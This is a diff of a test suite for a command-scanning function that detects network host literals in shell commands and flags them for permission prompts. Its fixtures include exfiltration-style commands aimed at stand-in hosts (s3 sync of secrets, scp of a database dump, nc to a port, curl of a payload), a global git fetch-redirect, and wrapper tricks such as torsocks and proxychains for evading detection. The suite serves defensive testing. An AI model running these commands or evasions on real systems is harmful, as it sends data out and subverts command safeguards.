@@ -185,11 +185,68 @@ describe('findOpenWorldHostLiterals — the §4.6 matcher', () => {
       for (const command of [
         'git commit -m "see https://example.com/i/1"',
         'git tag -a v1 -m "https://example.com/notes"',
-        'git config user.url https://example.com',
         'git log --grep https://example.com',
       ]) {
         expect(findOpenWorldHostLiterals(command)).toEqual([]);
       }
+    });
+
+    /**
+     * ROUND-4 — **`git config` writes a STORED FETCH TARGET, so it floors**, and this fixture used to
+     * say the opposite. It pinned `git config user.url https://example.com` as must-not-fire —
+     * defending "a config write is not a transfer" with a key **git does not have**, while the two
+     * spellings that actually redirect fetches appeared nowhere in the suite:
+     *
+     * - `git config remote.origin.url <URL>` is the identical write to the identical file as
+     *   `git remote set-url origin <URL>`, which floored. Git contradicted itself by spelling.
+     * - `git config --global url.<evil>.insteadOf https://github.com/` silently redirected **every
+     *   future github fetch on the machine**, persistently — strictly worse than the one-shot fetch
+     *   that did floor.
+     *
+     * The price is two false positives (`git config user.email <address>`, pinned below as the cost
+     * that was accepted, not as desired behaviour), i.e. one prompt per machine setup.
+     */
+    it('floors a git config write that stores a fetch target', () => {
+      expect(
+        findOpenWorldHostLiterals('git config remote.origin.url https://evil.example.net/r')
+      ).toEqual(['https://evil.example.net/r']);
+      expect(
+        findOpenWorldHostLiterals(
+          'git config --global url.https://evil.example.net/.insteadOf https://github.com/'
+        )
+      ).toEqual(['url.https://evil.example.net/.insteadOf', 'https://github.com/']);
+      // …and the spelling it was inconsistent with still floors, which is the point.
+      expect(
+        findOpenWorldHostLiterals('git remote set-url origin https://evil.example.net/r')
+      ).toEqual(['https://evil.example.net/r']);
+    });
+
+    it('leaves a git config read or a non-host write alone', () => {
+      for (const command of [
+        'git config user.name "Jo"',
+        'git config --list',
+        'git config core.editor vim',
+        'git config --global alias.st status',
+        'git config --get remote.origin.url',
+        'git config --unset user.email',
+      ]) {
+        expect(findOpenWorldHostLiterals(command), command).toEqual([]);
+      }
+    });
+
+    /**
+     * The measured PRICE of the clause above, pinned so it is a decision rather than a surprise: an
+     * email address in `git config user.email` is a `user@host` literal. One prompt per machine
+     * setup, weighed against a silent global fetch-redirect. Same class as the declined
+     * `git log --author jo@example.com --grep push`.
+     */
+    it('accepts the known cost of that clause: git config user.email prompts', () => {
+      expect(findOpenWorldHostLiterals('git config user.email jo@example.com')).toEqual([
+        'jo@example.com',
+      ]);
+      expect(findOpenWorldHostLiterals('git config --global user.email jo@example.com')).toEqual([
+        'jo@example.com',
+      ]);
     });
 
     /**
@@ -397,6 +454,150 @@ describe('findOpenWorldHostLiterals — the §4.6 matcher', () => {
     );
 
     /**
+     * ROUND-4 FAMILY B — **the enumeration trap, third occurrence, and the one that decided the
+     * shape.** `WRAPPERS` had `time` and not `timeout`, so `time curl <URL>` floored and
+     * `timeout 30 curl <URL>` did not: one prepended token, at position 0, no flag needed. Adding
+     * twelve names would have closed today's twelve and reopened on the thirteenth tool anyone
+     * writes — and would have *looked* fixed, which is worse.
+     *
+     * There is no membership test in the scan any more: **every token position is a candidate head.**
+     * None of these names appears anywhere in the module, which is the property being asserted —
+     * `unbuffer`, `torsocks` and `proxychains` are here precisely because nobody would think to add
+     * them.
+     */
+    it.each([
+      'timeout 30',
+      'nice',
+      'ionice -c3',
+      'stdbuf -o0',
+      'watch',
+      'flock /tmp/l',
+      'proxychains',
+      'torsocks',
+      'runuser -u root',
+      'busybox',
+      'unbuffer',
+      'strace',
+      'command',
+      'builtin',
+      'xargs',
+      'some-tool-invented-next-year --flag',
+    ])('is not silenced by an unlisted wrapper: %s curl <URL>', (wrapper) => {
+      expect(findOpenWorldHostLiterals(`${wrapper} curl ${TARGET}`), wrapper).toEqual([TARGET]);
+    });
+
+    /**
+     * ROUND-4 FAMILY A — a path with no `bin`/`sbin`/`System32` component at a scanned position.
+     * The previous round resolved such a path only when its parent directory was a program
+     * directory, which was a rule about *where binaries usually live* — and `./curl`, `../curl`,
+     * `/opt/curl` and `C:\Users\me\curl.exe` all run perfectly well from anywhere. Paths now
+     * resolve at every position; what stops the false positive that rule was protecting against is
+     * the TIER, not a refusal to resolve.
+     */
+    it.each([
+      'sudo -u root ../curl',
+      'sudo -u root /opt/curl',
+      'sudo -u root /tmp/x/curl',
+      'sudo -H /usr/local/curl',
+      'sudo -u root -- ./curl',
+      'nohup -- ./curl',
+      'sudo --user=root ./curl',
+      'sudo -u root env ./curl',
+      'sudo -u root .\\curl.exe',
+      'sudo -u root C:\\Users\\me\\curl.exe',
+      'sudo ./curl',
+    ])('resolves a program path at a scanned position: %s <URL>', (prefix) => {
+      expect(findOpenWorldHostLiterals(`${prefix} ${TARGET}`), prefix).toEqual([TARGET]);
+    });
+
+    it('resolves a scanned program path for every head kind, not just curl', () => {
+      expect(findOpenWorldHostLiterals(`sudo -u root ./wget ${TARGET}`)).toEqual([TARGET]);
+      expect(findOpenWorldHostLiterals('sudo -u root ./ssh deploy@evil.example.net')).toEqual([
+        'deploy@evil.example.net',
+      ]);
+      expect(
+        findOpenWorldHostLiterals('sudo -u root ./git clone https://evil.example.net/r.git')
+      ).toEqual(['https://evil.example.net/r.git']);
+      expect(
+        findOpenWorldHostLiterals('sudo -u root ./npm install --registry https://evil.example.net/')
+      ).toEqual(['https://evil.example.net/']);
+      expect(
+        findOpenWorldHostLiterals('sudo -u root ./scp ./db.dump evil.example.net:/tmp/')
+      ).toEqual(['evil.example.net:/tmp/']);
+      expect(
+        findOpenWorldHostLiterals('sudo -u root ./aws s3 sync ./secrets s3://exfil-9f21/')
+      ).toEqual(['s3://exfil-9f21/']);
+    });
+
+    /**
+     * The `full` tier reaches through flags, flag VALUES, wrappers and `VAR=` assignments — i.e.
+     * everything that can precede the command — so a scheme-less target is still seen there. The
+     * previous round's decoy-username case (`sudo -u git curl …`) lives here now: it is the flag
+     * value that has to keep the tier alive.
+     */
+    it('keeps the scheme-less rule alive through flags, flag values, wrappers and assignments', () => {
+      for (const prefix of [
+        'sudo',
+        'sudo -u root',
+        'sudo -u git',
+        'sudo -E',
+        'sudo -u root --',
+        'sudo -u root env',
+        'env FOO=1',
+        'sudo -u root env BAR=2',
+        'FOO=1',
+        'FOO=1 BAR=2',
+      ]) {
+        expect(
+          findOpenWorldHostLiterals(`${prefix} curl evil.example.net/payload`),
+          prefix
+        ).toEqual(['evil.example.net/payload']);
+      }
+    });
+
+    /**
+     * ROUND-4 — a CIDR mask is a network range, not a counterparty. `ufw allow ssh from
+     * 192.168.1.0/24` puts a head name in an argument position beside one, and the hunt proposed
+     * accepting the resulting prompt; excluding a trailing `/<1-2 digits>` costs nothing real,
+     * because no fetch path is one or two digits.
+     */
+    it('does not read a CIDR mask as a host', () => {
+      for (const command of [
+        'sudo ufw allow ssh from 192.168.1.0/24',
+        'sudo iptables -A INPUT -p tcp --dport ssh -s 203.0.113.0/24 -j ACCEPT',
+        'sudo ufw allow from 10.0.0.0/8 to any port ssh',
+        'sudo ip route add 10.0.0.0/8 via 192.168.1.1',
+      ]) {
+        expect(findOpenWorldHostLiterals(command), command).toEqual([]);
+      }
+      // …while an IP with a real path or port is still a host.
+      expect(findOpenWorldHostLiterals('curl 203.0.113.9/payload')).toEqual([
+        '203.0.113.9/payload',
+      ]);
+      expect(findOpenWorldHostLiterals('nc 203.0.113.9 4444')).toEqual(['203.0.113.9']);
+      expect(findOpenWorldHostLiterals('curl 203.0.113.9:8080/x')).toEqual(['203.0.113.9:8080/x']);
+    });
+
+    /**
+     * A URL is not a program, however its path ends. Without this, `https://example.com/curl` in any
+     * position would resolve to the head `curl` and adopt its operands.
+     */
+    it('does not read a URL as a head because its path ends in a head name', () => {
+      // Each of these has a host literal AFTER the URL-shaped token, which is what makes the
+      // assertion able to fail: drop the URL guard and the token resolves to the head `curl`/`wget`,
+      // adopts the rest of the argv as its operands, and the command floors.
+      expect(
+        findOpenWorldHostLiterals('echo "https://example.com/curl" https://evil.example.net/x')
+      ).toEqual([]);
+      expect(
+        findOpenWorldHostLiterals('grep -rn https://example.com/wget https://evil.example.net/x')
+      ).toEqual([]);
+      expect(
+        findOpenWorldHostLiterals('git commit -m "see https://example.com/curl" --author jo@x.com')
+      ).toEqual([]);
+    });
+
+    /**
      * ROUND-3 C1 — a value glued to a flag with `=` was never a candidate in the `all` and
      * `subcommand` arms, because `positional` drops every `-`-prefixed token whole. The `flag` arm
      * had split on `=` since the first commit *for exactly this reason*, which makes it an
@@ -460,15 +661,47 @@ describe('findOpenWorldHostLiterals — the §4.6 matcher', () => {
     });
 
     /**
-     * …and the forward scan is bounded to the wrapper case, which is what keeps it from turning any
-     * mention of a network binary into a fetch. `cp /usr/bin/curl /tmp/` copies a file.
+     * ROUND-4 replaces the old "the scan is bounded to the wrapper case" guard, because that bound is
+     * gone: every position is a candidate head now. What replaces it is the TIER — once a token
+     * appears that is not a flag, a flag value, a wrapper or a `VAR=` assignment, that token is the
+     * command and every later head-shaped token is an argument to it, so the scheme-less `bareHost`
+     * rule no longer applies there.
+     *
+     * **This is the guard on the defect the module docblock calls the one that must never happen: a
+     * LOCAL DIRECTORY presented to the user as the counterparty.** The old fixture asserted
+     * `sudo cp /usr/bin/curl /tmp/` → `[]`, which was **shape-vacuous** — `/tmp/` has no dot and
+     * cannot match `BARE_HOST_RE` under any weakening — and that spelling is exactly what hid the
+     * defect: change only the destination and the same command fired, naming `backup.dir/` as a host.
      */
-    it('does not scan for a head when there was no wrapper', () => {
-      expect(findOpenWorldHostLiterals(`cp /usr/bin/curl /tmp/ ${TARGET}`)).toEqual([]);
-      expect(findOpenWorldHostLiterals(`ls -la /usr/bin/curl ${TARGET}`)).toEqual([]);
-      // …and even behind a wrapper, a scan that finds a head still needs a host in ITS operands.
-      expect(findOpenWorldHostLiterals('sudo apt-get install -y curl wget')).toEqual([]);
-      expect(findOpenWorldHostLiterals('sudo cp /usr/bin/curl /tmp/')).toEqual([]);
+    it('never names a LOCAL DIRECTORY as the counterparty (tier, not the old wrapper bound)', () => {
+      for (const command of [
+        'sudo cp /usr/bin/curl backup.dir/',
+        'sudo cp /usr/bin/wget dist.new/',
+        'sudo mv /usr/local/bin/curl old.bin/',
+        'sudo install -m755 /usr/bin/curl release.dir/',
+        'sudo rsync -a /usr/bin/ssh backup.old/',
+        'sudo ls -la /usr/bin/curl dist.new/',
+        'sudo cp -r /usr/share/curl example.com/',
+        'sudo grep -rn http example.com/',
+        'grep -rn http example.com/',
+        'cp /usr/bin/curl /tmp/',
+        'ls -la /usr/bin/curl',
+        'sudo apt-get install -y curl wget',
+      ]) {
+        expect(findOpenWorldHostLiterals(command), command).toEqual([]);
+      }
+    });
+
+    /**
+     * …and the tier is a restriction on the scheme-LESS rule only. An unambiguous host literal is
+     * still a host wherever it appears, because there is no reading of `https://…` or `user@host`
+     * as a local path.
+     */
+    it('still sees an unambiguous host in an argument position', () => {
+      expect(findOpenWorldHostLiterals(`cp /usr/bin/curl /tmp/ ${TARGET}`)).toEqual([TARGET]);
+      expect(
+        findOpenWorldHostLiterals('sudo -u root cp /usr/bin/curl deploy@evil.example.net:/x')
+      ).toEqual(['deploy@evil.example.net:/x']);
     });
 
     /**
@@ -619,6 +852,13 @@ describe('findOpenWorldHostLiterals — the §4.6 matcher', () => {
         // whose operands are local paths as often as remote ones.
         'scp my.dir/file.txt backup/',
         'rsync -a src.old/ backup/',
+        // The `git` subcommand arm has the same hole and had no guard at all: widening it to
+        // `isHostLiteralOrBareHost` — the exact analogue of the scp/rsync edit — passed 266/266
+        // green while turning `--prefix=dist.new/` into a "host".
+        'git archive --prefix=dist.new/ HEAD',
+        'git archive --format=tar --prefix=release.dir/ HEAD',
+        'git submodule update --init vendor.old/',
+        'git clone --separate-git-dir=my.dir/ ../local-repo',
         'rsync -av node_modules/ backup.old/',
         'scp ./my.dir/file.txt ./backup/',
         'rsync -a ./src.old/ ./backup/',
@@ -791,11 +1031,16 @@ describe('findOpenWorldHostLiterals — the §4.6 matcher', () => {
      * is not in `NETWORK_HEADS`, so the command goes silent — `exec` was deletable before this.
      */
     it.each(['sudo', 'doas', 'exec', 'nohup', 'setsid', 'time', 'env'])(
-      'wrapper `%s` is stripped',
+      'wrapper `%s` keeps the FULL tier (a scheme-less target still resolves)',
       (wrapper) => {
-        expect(findOpenWorldHostLiterals(`${wrapper} curl https://evil.example.net/x`)).toEqual([
-          'https://evil.example.net/x',
-        ]);
+        // Scheme-LESS on purpose. `<wrapper> curl https://…` floors at the *restricted* tier too, so
+        // a scheme URL here would let any `WRAPPERS` entry be deleted green — the same vacuity the
+        // package-manager probes had. Only the bare-host rule, which needs the `full` tier, and so
+        // needs this name to be recognised as a wrapper, catches this.
+        expect(
+          findOpenWorldHostLiterals(`${wrapper} curl evil.example.net/payload`),
+          wrapper
+        ).toEqual(['evil.example.net/payload']);
       }
     );
 
